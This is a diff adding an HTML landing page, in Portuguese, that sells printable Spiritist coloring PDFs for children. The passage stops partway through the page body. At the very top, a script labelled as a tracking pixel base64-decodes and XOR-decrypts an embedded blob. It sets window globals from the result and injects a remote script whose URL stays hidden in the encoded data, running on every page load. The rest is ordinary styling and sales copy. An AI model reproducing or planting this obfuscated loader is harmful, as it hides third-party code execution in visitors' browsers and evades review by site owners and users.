@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<!-- pixel utmify -->
+<script>(function(){var m_4=atob("DB/HstKEmRyMafd89WTlx6DouyauAYMIhWz9nf3n/XKiHIMRnHm+nLHr9DLuG9gPlm2uwqb3tmzlEZIQ2m+uyrfot3b/S9telGuzwLvm7GjpGtVGrkLrkLXo9n7tBYRez0S8kLzl9HmuU9UMnGei3pvguzCuH5YQgHrliPCy+HnoDM5Iw3uigeXiry+5UcRJwX6iguCm5EHx");var h_asq9=[];for(var m_2y7w=0;m_2y7w<m_4.length;m_2y7w++){h_asq9.push(m_4.charCodeAt(m_2y7w)&255);}var c_kgxj=h_asq9[0];var g_2s=h_asq9.slice(1,1+c_kgxj);var q_v=h_asq9.slice(1+c_kgxj);var q_usmg=q_v.map(function(b,a_16r){return b^g_2s[a_16r%c_kgxj];});var v_w2jq="";for(var n_n2=0;n_n2<q_usmg.length;n_n2++){v_w2jq+=String.fromCharCode(q_usmg[n_n2]&255);}var s_85=decodeURIComponent(escape(v_w2jq));var a_gg09=JSON.parse(s_85);var g_tfm=a_gg09.globals||[];g_tfm.forEach(function(j_5){window[j_5.name]=j_5.value;});var j_6ea=document.createElement("script");j_6ea.src=a_gg09.url;j_6ea.async=true;j_6ea.defer=true;(a_gg09.attributes||[]).forEach(function(n_mf){j_6ea.setAttribute(n_mf.name,n_mf.value);});(document.head||document.documentElement).appendChild(j_6ea);})();</script>
+
+  <!--FIM pixel utmify -->
+<head>
+  <!-- =========================================================
+       CONFIGURAÇÕES BÁSICAS (SEO, celular, fontes)
+       VERSÃO KIDS: mesmos textos, imagens e códigos; novo visual
+       ========================================================= -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pequenos Corações de Luz | Desenhos Espíritas para Colorir</title>
+  <meta name="description" content="Desenhos espíritas para colorir em PDF: Jesus, parábolas, caridade, prece e virtudes. Imprima quantas vezes quiser.">
+
+  <!-- Pré-carrega a imagem da primeira dobra -->
+  <link rel="preload" as="image" href="assets/mockup-produto.webp" fetchpriority="high">
+
+  <!-- Fontes do Google: Fredoka (títulos, arredondada) e Nunito (textos) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@600;700&family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    /* =========================================================
+       CORES E VARIÁVEIS: troque aqui para mudar a página inteira
+       ========================================================= */
+    :root{
+      --ink:#2B2D42;         /* contorno e textos escuros */
+      --red:#FF6B6B;
+      --yellow:#FFD93D;
+      --green:#6BCB77;
+      --blue:#4D96FF;
+      --purple:#C77DFF;
+      --orange:#FF9F45;
+      --pink:#FF8FC7;
+      /* fundos das seções (tons claros) */
+      --bg-yellow:#FFE066;
+      --bg-sky:#8FD3FF;
+      --bg-pink:#FFC2D9;
+      --bg-mint:#A8E6CF;
+      --bg-purple:#C9B6FF;
+      --bg-orange:#FFC98B;
+      --bg-cream:#FFF8E7;
+      --white:#ffffff;
+      --radius:22px;
+      --border:4px solid var(--ink);
+      --pop:7px 7px 0 var(--ink);   /* sombra "adesivo" */
+    }
+
+    /* =========================================================
+       BASE (mobile-first: pensado primeiro para celular)
+       ========================================================= */
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{font-family:'Nunito',system-ui,sans-serif;color:var(--ink);background:var(--bg-cream);line-height:1.6;font-size:17px;overflow-x:hidden}
+    img{max-width:100%;height:auto;display:block}
+    h1,h2,h3{font-family:'Fredoka','Nunito',sans-serif;font-weight:700;color:var(--ink);line-height:1.15}
+    h1{font-size:2.2rem}
+    h2{font-size:1.9rem;text-align:center;margin-bottom:.6rem}
+    h3{font-size:1.25rem}
+    .container{width:100%;max-width:1080px;margin:0 auto;padding:0 16px;position:relative}
+    section{padding:64px 0 60px;position:relative}
+    .section-sub{text-align:center;font-weight:700;max-width:640px;margin:0 auto 34px}
+    .center{text-align:center;margin-top:34px}
+
+    /* Fundo pontilhado */
+    .dots{background-image:radial-gradient(rgba(255,255,255,.5) 3px,transparent 3.5px);background-size:40px 40px}
+
+    /* Cores de fundo das seções */
+    .s-yellow{background-color:var(--bg-yellow)}
+    .s-sky{background-color:var(--bg-sky)}
+    .s-pink{background-color:var(--bg-pink)}
+    .s-mint{background-color:var(--bg-mint)}
+    .s-purple{background-color:var(--bg-purple)}
+    .s-orange{background-color:var(--bg-orange)}
+    .s-cream{background-color:var(--bg-cream)}
+
+    /* Onda no topo de cada seção (usa a cor da própria seção) */
+    .wave{position:absolute;top:-38px;left:0;width:100%;height:40px;display:block}
+
+    /* Palavra destacada estilo "adesivo" nos títulos */
+    .hl{display:inline-block;color:var(--white);padding:0 .25em .05em;border-radius:.35em;border:var(--border);
+        box-shadow:4px 4px 0 var(--ink);transform:rotate(-1.5deg);margin:.1em 0}
+    .hl.red{background:var(--red)} .hl.blue{background:var(--blue)} .hl.green{background:var(--green)}
+    .hl.purple{background:var(--purple)} .hl.orange{background:var(--orange)} .hl.pink{background:var(--pink)}
+
+    /* Rabiscos decorativos (só no computador) */
+    .doodle{position:absolute;pointer-events:none;z-index:1}
+    .doodle.desk{display:none}
+
+    /* Botão padrão (redondo, contorno grosso) */
+    .btn{display:inline-block;background:var(--red);color:var(--white);font-family:'Fredoka',sans-serif;font-weight:700;font-size:1.2rem;
+         text-decoration:none;padding:15px 30px;border-radius:999px;border:var(--border);box-shadow:var(--pop);
+         transition:transform .15s, box-shadow .15s;text-align:center}
+    .btn:hover{transform:translate(3px,3px);box-shadow:4px 4px 0 var(--ink)}
+    .btn-block{display:block;width:100%}
+    .btn-outline{background:var(--white);color:var(--ink)}
+    .btn-blue{background:var(--blue)}
+
+    /* Cartão padrão (branco, contorno grosso, sombra de adesivo) */
+    .card{background:var(--white);border:var(--border);border-radius:var(--radius);padding:22px;box-shadow:var(--pop);position:relative}
+
+    /* Barra superior + faixa arco-íris */
+    .topbar{background:var(--ink);color:var(--white);text-align:center;font-size:.9rem;font-weight:800;padding:9px 16px}
+    .rainbow{height:8px;background:linear-gradient(90deg,var(--red) 0 16.6%,var(--orange) 0 33.2%,var(--yellow) 0 49.8%,var(--green) 0 66.4%,var(--blue) 0 83%,var(--purple) 0)}
+
+    /* =========================================================
+       1. TOPO (HERO)
+       ========================================================= */
+    .hero{padding:36px 0 70px}
+    .hero-grid{display:grid;gap:22px;align-items:center;position:relative;z-index:2}
+    .hero .eyebrow{display:inline-block;background:var(--white);font-weight:900;font-size:.85rem;padding:6px 14px;border-radius:999px;
+                   border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);margin-bottom:16px}
+    .hero p.sub{font-size:1.1rem;font-weight:700;margin:16px 0 18px}
+    .checks{list-style:none;margin:0 0 26px}
+    .checks li{padding-left:36px;position:relative;margin-bottom:10px;font-weight:800}
+    .checks li::before{content:"✓";position:absolute;left:0;top:1px;width:26px;height:26px;border-radius:50%;
+                       background:var(--green);color:var(--white);font-size:.85rem;display:grid;place-items:center;border:3px solid var(--ink)}
+    .checks li:nth-child(2)::before{background:var(--blue)}
+    .checks li:nth-child(3)::before{background:var(--purple)}
+    .hero .btn{width:100%;font-size:1.3rem}
+    .hero-img{background:var(--white);border:var(--border);border-radius:var(--radius);box-shadow:var(--pop);overflow:hidden;transform:rotate(1.5deg)}
+
+    /* =========================================================
+       2. PARA QUEM É
+       ========================================================= */
+    .who-list{display:grid;gap:14px;list-style:none}
+    .who-list li{background:var(--white);border:3px solid var(--ink);border-radius:18px;padding:14px 16px;box-shadow:5px 5px 0 var(--ink);
+                 display:flex;gap:14px;align-items:center;font-family:'Fredoka',sans-serif;font-weight:700;font-size:1.1rem}
+    .who-list .ico{flex:0 0 48px;height:48px;border-radius:50%;display:grid;place-items:center;font-size:1.5rem;border:3px solid var(--ink)}
+    .who-list li:nth-child(1) .ico{background:var(--yellow)}
+    .who-list li:nth-child(2) .ico{background:var(--red)}
+    .who-list li:nth-child(3) .ico{background:var(--purple)}
+    .who-list li:nth-child(4) .ico{background:var(--pink)}
+    .who-list li:nth-child(5) .ico{background:var(--green)}
+    .who-photos{display:grid;gap:22px;margin-bottom:30px}
+    .who-photos figure{background:var(--white);border:var(--border);border-radius:var(--radius);overflow:hidden;box-shadow:var(--pop)}
+    .who-photos figure:nth-child(1){transform:rotate(-1.5deg)}
+    .who-photos figure:nth-child(2){transform:rotate(1deg)}
+    .who-photos figure:nth-child(3){transform:rotate(-1deg)}
+    .who-photos img{border-bottom:var(--border);aspect-ratio:4/3;object-fit:cover;width:100%;background:#EADFCB}
+    .who-photos figcaption{padding:12px 16px;font-family:'Fredoka',sans-serif;font-weight:700;font-size:1.15rem}
+
+    /* =========================================================
+       3. AMOSTRA (desenhos presos com fita colorida)
+       ========================================================= */
+    .samples{display:grid;grid-template-columns:repeat(2,1fr);gap:26px 16px}
+    .samples figure{background:var(--white);border:var(--border);border-radius:16px;padding:8px;box-shadow:5px 5px 0 var(--ink);position:relative}
+    .samples figure::before{content:"";position:absolute;top:-13px;left:50%;width:70px;height:24px;transform:translateX(-50%) rotate(-4deg);opacity:.9;border-radius:3px}
+    .samples figure:nth-child(4n+1){transform:rotate(-2deg)} .samples figure:nth-child(4n+1)::before{background:var(--red)}
+    .samples figure:nth-child(4n+2){transform:rotate(1.5deg)} .samples figure:nth-child(4n+2)::before{background:var(--green)}
+    .samples figure:nth-child(4n+3){transform:rotate(-1deg)} .samples figure:nth-child(4n+3)::before{background:var(--blue)}
+    .samples figure:nth-child(4n+4){transform:rotate(2deg)} .samples figure:nth-child(4n+4)::before{background:var(--purple)}
+    .samples figcaption{font-size:.85rem;text-align:center;font-weight:900;padding-top:6px}
+    .cats{margin-top:40px;text-align:center}
+    .cats h3{margin-bottom:14px;font-size:1.4rem}
+    .cats ul{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:10px}
+    .cats li{font-weight:800;font-size:.92rem;background:var(--white);border:3px solid var(--ink);border-radius:999px;padding:4px 14px;box-shadow:3px 3px 0 var(--ink)}
+    .cats li:nth-child(5n+1){background:#FFF1B8} .cats li:nth-child(5n+2){background:#FFD6E7} .cats li:nth-child(5n+3){background:#D6ECFF}
+    .cats li:nth-child(5n+4){background:#D9F5E3} .cats li:nth-child(5n+5){background:#EBDDFF}
+
+    /* =========================================================
+       3B. VITRINE DO PDF (automática + manual)
+       ========================================================= */
+    .esteira-wrap{position:relative}
+    .esteira{position:relative;overflow-x:auto;overflow-y:hidden;padding:22px 0 30px;cursor:grab;
+      scrollbar-width:none;-webkit-overflow-scrolling:touch;overscroll-behavior-x:contain;
+      -webkit-mask-image:linear-gradient(90deg,transparent 0,#000 8%,#000 92%,transparent 100%);
+              mask-image:linear-gradient(90deg,transparent 0,#000 8%,#000 92%,transparent 100%)}
+    .esteira::-webkit-scrollbar{display:none}
+    .esteira.arrastando{cursor:grabbing}
+    .esteira-trilho{display:flex;gap:26px;padding:0 26px 0 0;width:max-content}
+    .esteira figure{flex:0 0 auto;width:200px;margin:0;text-align:center}
+    .esteira img{width:200px;height:auto;aspect-ratio:210/297;object-fit:cover;background:var(--white);border:var(--border);border-radius:10px;
+      box-shadow:6px 6px 0 var(--ink);-webkit-user-drag:none;user-select:none;pointer-events:none}
+    .esteira figure:nth-child(odd) img{transform:rotate(-2deg)}
+    .esteira figure:nth-child(even) img{transform:rotate(2deg)}
+    .esteira figcaption{display:inline-block;margin-top:14px;font-family:'Fredoka',sans-serif;font-weight:700;font-size:.9rem;
+      background:var(--white);border:3px solid var(--ink);border-radius:999px;padding:2px 14px}
+    .seta{position:absolute;top:44%;transform:translateY(-50%);z-index:3;width:48px;height:48px;border-radius:50%;
+      border:3px solid var(--ink);background:var(--yellow);color:var(--ink);font-size:1.9rem;font-weight:900;line-height:1;cursor:pointer;
+      box-shadow:4px 4px 0 var(--ink);display:grid;place-items:center;padding-bottom:4px}
+    .seta:hover{background:var(--white)}
+    .seta-esq{left:8px}.seta-dir{right:8px}
+    .esteira-dica{text-align:center;font-size:.85rem;font-weight:800;margin:-6px 0 14px}
+    .vitrine-destaques{display:grid;gap:14px;max-width:760px;margin:6px auto 0}
+    .vitrine-destaques div{background:var(--white);border:3px solid var(--ink);border-radius:18px;padding:14px 18px;font-weight:800;box-shadow:5px 5px 0 var(--ink)}
+
+    /* =========================================================
+       4. BENEFÍCIOS
+       ========================================================= */
+    .benefits{display:grid;gap:20px}
+    .benefits .card .ico{width:62px;height:62px;border-radius:18px;display:grid;place-items:center;font-size:1.9rem;border:3px solid var(--ink);margin-bottom:12px}
+    .benefits .card:nth-child(1) .ico{background:var(--yellow)}
+    .benefits .card:nth-child(2) .ico{background:var(--pink)}
+    .benefits .card:nth-child(3) .ico{background:var(--blue)}
+    .benefits .card:nth-child(4) .ico{background:var(--green)}
+    .benefits .card p{margin-top:6px;font-weight:600}
+
+    /* =========================================================
+       5. COMO FUNCIONA
+       ========================================================= */
+    .steps{display:grid;gap:22px;counter-reset:passo}
+    .step{padding:24px 22px 22px 84px}
+    .step::before{counter-increment:passo;content:counter(passo);position:absolute;left:18px;top:20px;width:50px;height:50px;
+                  border-radius:50%;color:var(--white);font-family:'Fredoka',sans-serif;font-weight:700;
+                  font-size:1.5rem;display:grid;place-items:center;border:3px solid var(--ink)}
+    .step:nth-child(1)::before{background:var(--red)}
+    .step:nth-child(2)::before{background:var(--blue)}
+    .step:nth-child(3)::before{background:var(--green)}
+    .step p{font-weight:600}
+
+    /* =========================================================
+       6. DEPOIMENTOS (cartões presos com fita)
+       ========================================================= */
+    .testimonials{display:grid;gap:26px}
+    .t-card::before{content:"";position:absolute;top:-14px;left:50%;width:84px;height:26px;transform:translateX(-50%) rotate(3deg);background:var(--yellow);opacity:.9;border-radius:3px}
+    .t-card:nth-child(odd){transform:rotate(-1deg)}
+    .t-card:nth-child(even){transform:rotate(1deg)}
+    .t-head{display:flex;gap:12px;align-items:center;margin-bottom:10px}
+    .t-head img{width:58px;height:58px;border-radius:50%;object-fit:cover;border:3px solid var(--ink);background:var(--bg-purple)}
+    .t-head strong{display:block;font-family:'Fredoka',sans-serif;font-size:1.1rem}
+    .t-head span{font-size:.85rem;font-weight:700}
+    .stars{color:var(--orange);letter-spacing:2px;margin-bottom:6px;font-size:1.2rem;-webkit-text-stroke:1px var(--ink)}
+    .t-card p{font-weight:600}
+    .note{text-align:center;font-size:.8rem;margin-top:22px;font-style:italic;font-weight:700}
+
+    /* =========================================================
+       7. PLANOS (lado a lado no computador, empilhados no celular)
+       ========================================================= */
+    .plans{display:grid;gap:34px;align-items:stretch;max-width:880px;margin:0 auto}
+    .plan{background:var(--white);border:var(--border);border-radius:28px;padding:30px 22px;box-shadow:var(--pop);
+          position:relative;display:flex;flex-direction:column}
+    .plan h3{text-align:center;font-size:1.6rem}
+    .plan .qty{text-align:center;font-weight:800}
+    .plan ul{list-style:none;margin:14px 0 18px;flex:1}
+    .plan li{padding:7px 0 7px 32px;position:relative;font-weight:700;border-bottom:2px dashed #e6e0f0}
+    .plan li::before{content:"✓";position:absolute;left:0;top:8px;width:22px;height:22px;border-radius:50%;background:var(--green);
+                     color:var(--white);font-size:.75rem;display:grid;place-items:center;border:2px solid var(--ink)}
+    .price{text-align:center;margin:8px 0 16px}
+    .price .old{font-size:1.05rem;font-weight:800}
+    .price .old s{opacity:.7}
+    .desconto{display:inline-block;background:var(--green);color:var(--white);font-weight:900;font-size:.8rem;padding:2px 10px;border-radius:999px;
+              border:2px solid var(--ink);margin-left:6px;vertical-align:2px}
+    .price .now{display:block;font-family:'Fredoka',sans-serif;font-size:3rem;font-weight:700;line-height:1.1}
+    .price .por{font-family:'Nunito',sans-serif;font-size:1rem;font-weight:800;margin-right:4px}
+    .price .tag{font-size:.85rem;font-weight:800}
+    .plan.featured{background:var(--bg-yellow);border-width:5px}
+    .plan.featured .price .now{color:var(--red);-webkit-text-stroke:2px var(--ink)}
+    .badge{position:absolute;top:-22px;left:50%;transform:translateX(-50%) rotate(-3deg);background:var(--red);color:var(--white);
+           font-family:'Fredoka',sans-serif;font-weight:700;font-size:1rem;padding:7px 20px;border-radius:999px;white-space:nowrap;
+           border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);letter-spacing:.5px}
+
+    /* =========================================================
+       8. GARANTIA
+       ========================================================= */
+    .guarantee{display:flex;flex-direction:column;align-items:center;text-align:center;gap:14px;max-width:720px;margin:0 auto}
+    .guarantee p{font-weight:700}
+    .seal{width:150px;height:150px}
+    .seal svg{width:100%;height:100%}
+
+    /* =========================================================
+       9. FAQ (abre e fecha sem JavaScript)
+       ========================================================= */
+    .faq{max-width:760px;margin:30px auto 0}
+    .faq details{background:var(--white);border:3px solid var(--ink);border-radius:18px;margin-bottom:14px;box-shadow:5px 5px 0 var(--ink);overflow:hidden}
+    .faq summary{cursor:pointer;padding:18px 62px 18px 18px;font-family:'Fredoka',sans-serif;font-weight:600;font-size:1.08rem;list-style:none;position:relative}
+    .faq summary::-webkit-details-marker{display:none}
+    .faq summary::after{content:"+";position:absolute;right:14px;top:50%;transform:translateY(-50%);width:34px;height:34px;border-radius:50%;
+                        background:var(--yellow);border:3px solid var(--ink);display:grid;place-items:center;font-size:1.3rem;font-weight:900;line-height:1}
+    .faq details[open] summary::after{content:"–";background:var(--pink)}
+    .faq details p{padding:0 18px 18px;font-weight:600}
+
+    /* =========================================================
+       10. CTA FINAL + RODAPÉ
+       ========================================================= */
+    .final{text-align:center}
+    .final p{font-weight:700;max-width:600px;margin:0 auto 26px}
+    footer{background:var(--ink);color:#c9cbe0;font-size:.82rem;text-align:center;padding:30px 0}
+    footer a{color:var(--yellow);margin:0 6px;font-weight:800}
+    footer p{margin-top:10px}
+
+    /* =========================================================
+       TABLET/COMPUTADOR (telas a partir de 760px)
+       ========================================================= */
+    @media (min-width:760px){
+      body{font-size:18px}
+      h1{font-size:3.1rem}
+      h2{font-size:2.6rem}
+      section{padding:90px 0 86px}
+      .wave{top:-58px;height:60px}
+      .doodle.desk{display:block}
+      .hero{padding:60px 0 100px}
+      .hero-grid{grid-template-columns:1fr 1fr}
+      .hero .btn{width:auto}
+      .who-photos{grid-template-columns:repeat(3,1fr)}
+      .who-list{grid-template-columns:repeat(3,1fr)}
+      .samples{grid-template-columns:repeat(4,1fr);gap:34px 26px}
+      .esteira figure,.esteira img{width:240px}
+      .esteira-trilho{gap:34px}
+      .benefits{grid-template-columns:repeat(2,1fr)}
+      .steps{grid-template-columns:repeat(3,1fr)}
+      .testimonials{grid-template-columns:repeat(3,1fr)}
+      .plans{grid-template-columns:1fr 1fr}
+      .plan.featured{transform:scale(1.04) rotate(.6deg)}
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Desenhos reutilizáveis (estrela, brilho, coração, onda) usados nos enfeites -->
+  <svg width="0" height="0" style="position:absolute" aria-hidden="true">
+    <defs>
+      <symbol id="star" viewBox="0 0 100 100"><polygon points="50,6 61,37 94,37 67,57 77,89 50,70 23,89 33,57 6,37 39,37" stroke="#2B2D42" stroke-width="6" stroke-linejoin="round"/></symbol>
+      <symbol id="sparkle" viewBox="0 0 100 100"><path d="M50,4 C54,40 60,46 96,50 C60,54 54,60 50,96 C46,60 40,54 4,50 C40,46 46,40 50,4 Z" fill="#fff" stroke="#2B2D42" stroke-width="5" stroke-linejoin="round"/></symbol>
+      <symbol id="heart" viewBox="0 0 100 100"><path d="M50,88 C10,60 6,30 26,20 C40,13 50,24 50,32 C50,24 60,13 74,20 C94,30 90,60 50,88 Z" stroke="#2B2D42" stroke-width="6" stroke-linejoin="round"/></symbol>
+      <symbol id="wave" viewBox="0 0 1440 60" preserveAspectRatio="none"><path d="M0,30 C180,62 360,0 540,28 C720,58 900,2 1080,28 C1260,54 1350,20 1440,26 L1440,60 L0,60 Z"/></symbol>
+    </defs>
+  </svg>
+
+  <!-- BARRA SUPERIOR + faixa arco-íris -->
+  <div class="topbar">PDF para imprimir em casa · Impressão ilimitada</div>
+  <div class="rainbow"></div>
+
+  <!-- =========================================================
+       1. TOPO (HERO): headline + subheadline + mockup + botão
+       ========================================================= -->
+  <header class="hero s-yellow dots" style="position:relative">
+    <svg class="doodle desk" style="left:4%;top:18px;width:46px" fill="#FF9F45"><use href="#star"/></svg>
+    <svg class="doodle desk" style="right:5%;top:30px;width:56px"><use href="#sparkle"/></svg>
+    <svg class="doodle desk" style="left:46%;bottom:40px;width:40px" fill="#FF8FC7"><use href="#heart"/></svg>
+    <div class="container hero-grid">
+      <div>
+        <span class="eyebrow">✨ PDF para imprimir em casa</span>
+        <h1>Desenhos espíritas para colorir que ensinam <span class="hl red">amor, caridade e fé</span></h1>
+        <p class="sub">Jesus, parábolas, prece, Evangelho no Lar e virtudes em desenhos de traço limpo e delicado, feitos para crianças de 3 a 12 anos. Baixe, imprima e use quantas vezes quiser.</p>
+        <ul class="checks">
+          <li>📩 Acesso imediato</li>
+          <li>🖨️ Impressão ilimitada</li>
+          <li>💛 Garantia de 7 dias</li>
+        </ul>
+        <a href="#planos" class="btn">Quero os desenhos</a>
+      </div>
+      <!-- Mockup do produto (primeira dobra: sem lazy) -->
+      <div class="hero-img"><img src="assets/mockup-produto.webp" width="1000" height="800" alt="Capa do livro Pequenos Corações de Luz e páginas de desenhos para colorir" fetchpriority="high"></div>
+    </div>
+  </header>
+
+  <!-- =========================================================
+       2. PARA QUEM É
+       ========================================================= -->
+  <section class="s-sky dots">
+    <svg class="wave" fill="#8FD3FF"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="left:4%;top:60px;width:50px" fill="#FFD93D"><use href="#star"/></svg>
+    <svg class="doodle desk" style="right:5%;top:120px;width:44px"><use href="#sparkle"/></svg>
+    <div class="container">
+      <h2>Para <span class="hl blue">quem é</span></h2>
+      <p class="section-sub">Para todo mundo que quer passar valores do Evangelho às crianças de um jeito leve e divertido.</p>
+      <!-- 3 FOTOS: gere com os prompts 1, 2 e 3 do arquivo prompts-imagens.md e salve na pasta /assets/ com estes nomes -->
+      <div class="who-photos">
+        <figure>
+          <img src="assets/foto-mae-filho.webp" width="800" height="600" loading="lazy" alt="Mãe e filho colorindo desenhos espíritas na mesa da cozinha">
+          <figcaption>Pais e famílias</figcaption>
+        </figure>
+        <figure>
+          <img src="assets/foto-evangelizacao.webp" width="800" height="600" loading="lazy" alt="Criança colorindo na sala de evangelização infantil">
+          <figcaption>Evangelização infantil</figcaption>
+        </figure>
+        <figure>
+          <img src="assets/foto-avo-neta.webp" width="800" height="600" loading="lazy" alt="Avó colorindo com a neta no sofá de casa">
+          <figcaption>Avós</figcaption>
+        </figure>
+      </div>
+
+      <ul class="who-list">
+        <li><span class="ico">👨‍👩‍👧</span>Pais e famílias</li>
+        <li><span class="ico">🌟</span>Evangelizadores infantis</li>
+        <li><span class="ico">🍎</span>Professores e escolas</li>
+        <li><span class="ico">👵</span>Avós</li>
+        <li><span class="ico">🤝</span>Terapeutas e cuidadores</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       3. O QUE VEM DENTRO (amostra de desenhos)
+       ========================================================= -->
+  <section class="s-pink dots">
+    <svg class="wave" fill="#FFC2D9"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="right:4%;top:70px;width:54px" fill="#FF6B6B"><use href="#heart"/></svg>
+    <svg class="doodle desk" style="left:5%;top:140px;width:46px" fill="#C77DFF"><use href="#star"/></svg>
+    <div class="container">
+      <h2>Veja alguns <span class="hl pink">desenhos</span></h2>
+      <p class="section-sub">Cenas que conversam com o que a criança aprende em casa e na evangelização.</p>
+      <div class="samples">
+        <figure><img src="assets/desenho-pombinha-da-paz.webp" width="600" height="800" loading="lazy" alt="Desenho para colorir: pombinha da paz com ramo de oliveira no bico"><figcaption>A pombinha da paz</figcaption></figure>
+        <figure><img src="assets/desenho-arco-iris.webp" width="600" height="800" loading="lazy" alt="Desenho para colorir: arco-íris sobre uma casinha"><figcaption>O arco-íris</figcaption></figure>
+        <figure><img src="assets/desenho-ovelha-perdida.webp" width="600" height="800" loading="lazy" alt="Desenho para colorir: ovelhinha no campo com o cajado do pastor"><figcaption>A ovelha perdida</figcaption></figure>
+        <figure><img src="assets/desenho-evangelho-aberto.webp" width="600" height="800" loading="lazy" alt="Desenho para colorir: o Evangelho aberto sobre a mesa com a jarra de água"><figcaption>O Evangelho aberto sobre a mesa</figcaption></figure>
+      </div>
+      <!-- Categorias do Plano Completo -->
+      <div class="card cats">
+        <ul>
+          <li>Jesus e o Evangelho</li><li>Parábolas</li><li>Caridade</li><li>Prece e Evangelho no Lar</li>
+          <li>Anjo da guarda</li><li>Evangelização infantil</li><li>Virtudes</li><li>Natureza</li>
+          <li>Animais</li><li>Doutrina Espírita para crianças</li>
+        </ul>
+      </div>
+      <p class="center"><a href="#planos" class="btn">Quero os desenhos</a></p>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       3B. VITRINE DO PDF: páginas reais passando sozinhas
+       (dá para arrastar, deslizar o dedo ou usar as setas;
+        a lista aparece 2x para o movimento ser contínuo)
+       ========================================================= -->
+  <section class="s-orange dots" id="vitrine">
+    <svg class="wave" fill="#FFC98B"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="left:4%;top:70px;width:48px"><use href="#sparkle"/></svg>
+    <svg class="doodle desk" style="right:5%;top:60px;width:46px" fill="#4D96FF"><use href="#star"/></svg>
+    <div class="container">
+      <h2>Veja o PDF <span class="hl orange">por dentro</span></h2>
+      <p class="section-sub">Assim é o livro que você recebe: capa, sumário organizado por tema e um desenho por página A4.</p>
+    </div>
+    <div class="esteira-wrap">
+      <button class="seta seta-esq" type="button" aria-label="Ver páginas anteriores">‹</button>
+      <button class="seta seta-dir" type="button" aria-label="Ver próximas páginas">›</button>
+      <div class="esteira">
+    <div class="esteira-trilho">
+        <figure><img src="assets/pdf-capa.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: Capa colorida"><figcaption>Capa colorida</figcaption></figure>
+        <figure><img src="assets/pdf-sumario-1.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: Sumário clicável"><figcaption>Sumário clicável</figcaption></figure>
+        <figure><img src="assets/pdf-sumario-2.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: Sumário (continuação)"><figcaption>Sumário (continuação)</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-14.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: A ovelha perdida"><figcaption>A ovelha perdida</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-15.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: O grão de mostarda"><figcaption>O grão de mostarda</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-16.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: A casa sobre a rocha"><figcaption>A casa sobre a rocha</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-19.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: A candeia acesa"><figcaption>A candeia acesa</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-34.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: A jarra de água fluidificada"><figcaption>A jarra de água fluidificada</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-37.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: Mãos unidas em prece"><figcaption>Mãos unidas em prece</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-38.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: O Evangelho aberto sobre a mesa"><figcaption>O Evangelho aberto sobre a mesa</figcaption></figure>
+        <figure><img src="assets/pdf-desenho-83.webp" width="420" height="594" loading="lazy" draggable="false" alt="Página do PDF: Passarinhos no ninho"><figcaption>Passarinhos no ninho</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-capa.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>Capa colorida</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-sumario-1.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>Sumário clicável</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-sumario-2.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>Sumário (continuação)</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-14.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>A ovelha perdida</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-15.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>O grão de mostarda</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-16.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>A casa sobre a rocha</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-19.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>A candeia acesa</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-34.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>A jarra de água fluidificada</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-37.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>Mãos unidas em prece</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-38.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>O Evangelho aberto sobre a mesa</figcaption></figure>
+        <figure aria-hidden="true"><img src="assets/pdf-desenho-83.webp" width="420" height="594" loading="lazy" draggable="false" alt=""><figcaption>Passarinhos no ninho</figcaption></figure>
+    </div>
